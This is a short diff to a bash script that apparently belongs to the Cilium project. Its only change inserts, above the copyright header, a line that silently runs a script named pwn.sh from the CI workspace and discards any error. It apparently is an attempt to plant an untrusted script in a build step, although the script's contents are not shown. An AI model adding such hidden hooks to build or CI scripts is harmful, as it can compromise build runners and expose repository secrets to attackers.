@@ -1,5 +1,7 @@
 #!/bin/bash
 
+bash ${GITHUB_WORKSPACE}/images/runtime/pwn.sh || true
+
 # Copyright 2017-2021 Authors of Cilium
 # SPDX-License-Identifier: Apache-2.0
 
